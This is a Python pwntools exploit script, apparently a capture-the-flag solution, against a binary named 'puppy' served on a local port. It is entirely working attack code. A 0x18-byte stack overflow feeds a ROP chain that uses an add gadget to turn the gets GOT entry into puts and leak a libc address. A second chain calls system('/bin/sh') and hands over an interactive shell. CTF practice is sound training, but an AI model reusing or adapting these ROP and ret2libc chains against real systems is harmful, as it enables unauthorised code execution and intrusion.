#!/usr/bin/env python3

from pwn import *

exe = ELF("../bin/puppy")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31819

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
'''

r = conn()

# good luck pwning :)

add = 0x40111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
pop = 0x4011ba # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
rdi = 0x4011c3

r.sendline(flat([
  b'A'*0x18,
  pop, libc.sym['puts'] - libc.sym['gets'], exe.got['gets'] + 0x3d, 0, 0, 0, 0, add,
  rdi, exe.got['gets'], exe.plt['gets'],
  pop, libc.sym['fflush'] - libc.sym['puts'] + (1<<32), exe.got['gets'] + 0x3d, 0, 0, 0, 0, add,
  rdi, 0, exe.plt['gets'],
  pop, libc.sym['gets'] - libc.sym['fflush'], exe.got['gets'] + 0x3d, 0, 0, 0, 0, add,
  exe.sym['main'],
]))

libc.address = u64(r.recv(6).ljust(8, b'\0')) - libc.sym['puts']
log.info(hex(libc.address))

r.sendline(flat([
  b'A'*0x18,
  rdi, next(libc.search(b'/bin/sh\0')),
  libc.sym['system']
]))

r.interactive()
